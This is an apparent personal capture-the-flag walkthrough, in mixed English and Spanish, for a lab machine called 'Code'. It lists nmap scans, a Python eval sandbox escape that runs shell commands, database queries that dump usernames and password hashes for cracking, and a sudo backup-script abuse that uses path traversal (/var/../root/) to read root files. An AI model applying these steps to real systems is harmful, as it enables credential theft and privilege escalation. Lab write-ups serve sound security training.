---
title: Code
draft: true
tags:
---
# Enumeration
## Port Scanning
- Using [[content/Tools/Activas/3. Escaneo de puertos/nmap|nmap]] in order to get the open ports and sevices running behind this ports
```bash
nmap -p- -sS -n -Pn --min-rate 5000 10.10.11.62
nmap -p22,5000 -sVC -n -Pn --min-rate 5000 10.10.11.62 -oN Targeted -oX Targeted.xml
```

## Web site
- The web side can interpret python code, maybe we can ejecute, system comand, but some words are black listed
>[!example]- Result
>![[Pasted image 20250323224537.png]]

- maybe the web site is using me method "eval()" to block the black listed words, so y found this post talking about that, [link](https://netsec.expert/posts/breaking-python3-eval-protections/)




```
To get usernames: print([u.username for u in db.session.query(User).all()])  
  
To get password hashes: print([u.password for u in db.session.query(User).all()])

().__class__.__bases__[0].__subclasses__()[317](['whoami'], shell=True)


```
esta pagina tiene cosas:
http://10.10.11.62:5000/

```
Foothold:  
Get creds from the code editor  
print([u.username for u in db.session.query(User).all()])  
print([u.password for u in db.session.query(User).all()])  
  
You get usernames and password hashes in MD5 (use crackstations or hashcat )  
  
User  
After SSH as user martin create task.json in /tmp  
{  
"destination": "/home/martin/",  
"multiprocessing": true,  
"verbose_log": false,  
"directories_to_archive": [  
"/home/app-production/"  
],  
"exclude": [  
".*"  
]  
}  
  
Run sudo /usr/bin/backy.sh task.json  
Extract the file found in martin : tar -xf code*****.tar.bz2  
cd to dir to get the user.txt  
  
For root, same process but /root is blacklisted, you can trick the backy.sh but modifying the above task.json using /var/../root/ for directory to archive....  
  
P.S. : You have to be quick, there is a cleanup script that remove everything in 2-3mn.
```